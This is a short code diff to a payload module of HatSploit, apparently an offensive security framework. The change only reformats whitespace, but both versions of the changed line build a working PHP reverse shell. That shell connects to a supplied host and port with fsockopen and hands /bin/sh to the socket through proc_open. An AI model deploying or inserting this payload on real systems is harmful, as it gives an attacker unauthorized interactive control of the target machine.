@@ -45,5 +45,5 @@ class HatSploitPayload(Payload):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        payload = f"php -r '$sock=fsockopen(\""+connback_host+"\","+connback_port+");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
+        payload = f"php -r '$sock=fsockopen(\"" + connback_host + "\"," + connback_port + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
         return payload
